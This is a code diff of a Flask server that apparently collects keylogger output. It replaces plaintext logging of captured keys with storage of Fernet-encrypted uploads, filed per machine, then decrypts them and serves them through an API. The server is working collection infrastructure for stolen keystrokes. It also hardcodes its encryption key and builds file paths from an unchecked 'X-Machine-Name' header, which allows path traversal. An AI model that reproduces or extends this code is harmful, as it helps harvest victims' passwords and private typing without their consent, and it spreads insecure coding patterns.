@@ -1,10 +1,14 @@
 from flask import Flask, render_template, request, jsonify
 import os
 import json
+from cryptography.fernet import Fernet
 
 app = Flask("__main__")
+key = b'9YxKn3m3G5qXz2o9xYxKn3m3G5qXz2o9xYxKn3m3G5q='
+fernet = Fernet(key)
 
 DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
+DECRYPTED_FOLDER = os.path.join(os.path.dirname(__file__), "decrypted_data")
 data_list = []
 
 
@@ -28,29 +32,48 @@ def get_data(machine):
     data_objects = {}
     for file_name in os.listdir(machine_path):
         file_path = os.path.join(machine_path, file_name)
-        with open(file_path, "r", encoding="utf-8") as file:
+        with open(file_path, "rb") as file:
             try:
-                data_objects[f"{file_name.strip('.json')}"] = json.load(file)
-            except json.JSONDecodeError:
-                data_objects[f"{file_name.strip('.json')}"] = {"error": f"{file_name} is not valid JSON"}
+                encrypted_data = file.read()
+                decrypted_data = fernet.decrypt(encrypted_data)
+                data_objects[f"{file_name.strip('.enc')}"] = json.loads(decrypted_data)
+            except (json.JSONDecodeError, Exception):
+                data_objects[f"{file_name.strip('.enc')}"] = {
+                    "error": f"{file_name} is not valid JSON or decryption failed"}
     return jsonify(data_objects), 200
 
 
 @app.route("/api/upload", methods=["POST"])
 def upload_api():
-    data = request.get_json()
-    if not data or "machine" not in data or "data" not in data or not isinstance(data["data"], list):
+    data = request.get_data()
+    if not data:
         return jsonify({"error": "Invalid payload"}), 400
 
-    with open("server_key_logs.txt", "a", encoding="utf-8") as f:
-        for log_dict in data["data"]:
-            for timestamp in log_dict:
-                for key in log_dict[timestamp]:
-                    f.write(f"{timestamp}\n{key}\n")
+    machine_name = request.headers.get("X-Machine-Name", "unknown")
+    machine_path = os.path.join(DATA_FOLDER, machine_name)
+    decrypted_machine_path = os.path.join(DECRYPTED_FOLDER, machine_name)
+    os.makedirs(machine_path, exist_ok=True)
+    os.makedirs(decrypted_machine_path, exist_ok=True)
 
-    data_list.append(data)
-    print("Current data list:", data_list)
-    return jsonify({"status": "success"}), 200
+    file_name = f"log_{len(os.listdir(machine_path)) + 1}.enc"
+    file_path = os.path.join(machine_path, file_name)
+
+    with open(file_path, "wb") as f:
+        f.write(data)
+
+    try:
+        decrypted_data = fernet.decrypt(data)
+        decrypted_json = json.loads(decrypted_data)
+        data_list.append(decrypted_json)
+
+        decrypted_file_name = f"log_{len(os.listdir(decrypted_machine_path)) + 1}.json"
+        decrypted_file_path = os.path.join(decrypted_machine_path, decrypted_file_name)
+        with open(decrypted_file_path, "w", encoding="utf-8") as f:
+            json.dump(decrypted_json, f, indent=2, ensure_ascii=False)
+
+        return jsonify({"status": "success"}), 200
+    except Exception:
+        return jsonify({"error": "Decryption failed"}), 400
 
 
 if __name__ == "__main__":
